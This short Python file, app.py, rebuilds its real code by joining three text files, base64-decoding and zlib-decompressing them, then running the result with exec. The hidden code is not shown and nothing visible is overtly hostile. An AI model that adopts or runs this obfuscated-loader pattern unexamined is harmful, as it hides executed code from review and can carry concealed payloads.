"""app.py - decompresses body from z0/z1/z2."""
import pathlib, zlib, base64
_root = pathlib.Path(__file__).resolve().parent
_b64 = "".join((_root / ("_z%d.txt" % i)).read_text(encoding="utf-8") for i in range(3))
_src = zlib.decompress(base64.b64decode(_b64)).decode("utf-8")
exec(compile(_src, str(_root / "app.py"), "exec"), globals())
